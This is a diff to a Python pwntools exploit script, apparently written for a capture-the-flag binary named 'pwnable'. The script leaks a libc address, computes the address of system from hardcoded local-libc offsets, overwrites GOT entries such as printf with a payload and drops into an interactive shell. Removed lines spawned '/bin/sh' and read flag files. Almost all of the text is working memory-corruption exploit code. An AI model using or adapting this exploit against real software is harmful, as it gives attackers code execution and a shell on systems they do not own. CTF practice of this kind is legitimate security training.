@@ -32,7 +32,7 @@ def offset_finder():
             
         p.close()
 
-def exploit(target, system_diff):
+def exploit(target):
     exit_got = binary.symbols["got.exit"]
     log.info("Exit@got: {}".format(hex(exit_got)))
     main_addr = 0x0804851b
@@ -59,7 +59,9 @@ def exploit(target, system_diff):
     libc_leak = p.recvline()[2:-1]
     libc_leak = int(libc_leak, 16)
     log.info("Libc leak: {}".format(hex(libc_leak)))
-    system_libc = libc_leak + system_diff    
+    libc_base = libc_leak - 0x18637 # local libc
+    log.info("Libc base: {}".format(hex(libc_base)))
+    system_libc = libc_base + 0x3ada0 # local libc
     log.info("Libc system: {}".format(hex(system_libc)))
 
     printf_got = binary.symbols["got.printf"]
@@ -86,15 +88,13 @@ def exploit(target, system_diff):
     #               c
     #               """)
 
-    p.sendline(payload)    
-    sleep(1)
-    p.sendline("/bin/sh\x00")
-    p.sendline("ls -lah / && cat /f*")
-
+    p.sendline(payload)   
     p.interactive()
     
 if __name__ == "__main__":
-    offset_finder()
+    #offset_finder()
+    p = process("./pwnable")
+    exploit(p)
     '''
     if len(sys.argv) < 2:
         log.info("Argument needed!")
